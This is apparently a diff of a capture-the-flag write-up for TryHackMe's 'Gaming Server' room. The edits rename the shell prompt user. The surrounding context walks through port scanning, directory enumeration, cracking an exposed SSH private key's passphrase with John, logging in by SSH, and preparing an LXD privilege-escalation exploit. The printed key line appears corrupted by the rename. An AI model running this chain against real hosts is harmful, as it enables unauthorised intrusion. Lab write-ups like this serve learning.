@@ -12,7 +12,7 @@ Can you gain access to this gaming server built by amateurs with no experience o
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ rustscan -a 10.10.141.254 -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -25,7 +25,7 @@ ________________________________________
  --------------------------------------
 TCP handshake? More like a friendly high-five!
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.141.254:22
@@ -102,7 +102,7 @@ We know there's a [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) so
 We can start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on port 80 with [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.141.254                   
 ===============================================================
 Gobuster v3.6
@@ -140,7 +140,7 @@ We go on /secret :
 And copy the key in a file with [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
 └─$ cat key                              
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -170,7 +170,7 @@ cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
 Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
 Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
 v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
-gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
+gbLFOSPp+GmklnRpimdn0xaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
 -----END RSA PRIVATE KEY-----
 
 ```
@@ -182,7 +182,7 @@ gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
 We use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) to make it readable to [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
 └─$ ssh2john key > pass.hash    
 ```
 
@@ -191,7 +191,7 @@ We use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) to make it rea
 Now we can use [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) to crack the hash :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
 └─$ john  pass.hash 
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -220,7 +220,7 @@ I gave the secretKey file the right permissions in a way that I had full access 
 I then logged in to machine via ssh using john as the user and the identity file key :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
 └─$ ssh -i key john@10.10.141.254
 Enter passphrase for key 'key': letmein
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
@@ -269,7 +269,7 @@ On reading around I found a way it can be used to escalate privileges on [exploi
 First thing we search for the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) on [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) and copy it to our directory :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
 └─$ searchsploit lxd
 ----------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                       |  Path
@@ -283,7 +283,7 @@ Shellcodes: No Results
 Now we host the [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) server for the download :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
@@ -327,7 +327,7 @@ So we need the .tar.gz alpine file, let's find out what it is .
 First we download the lxd alpine builder :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
 └─$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine   
 --2025-07-20 18:59:12--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
 Risoluzione di raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.110.133, 185.199.111.133, ...
@@ -344,7 +344,7 @@ build-alpine.1                    100%[=========================================
 Then we build the alpine file :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Gaming Server]
 └─$ sudo bash build-alpine
 ```
 
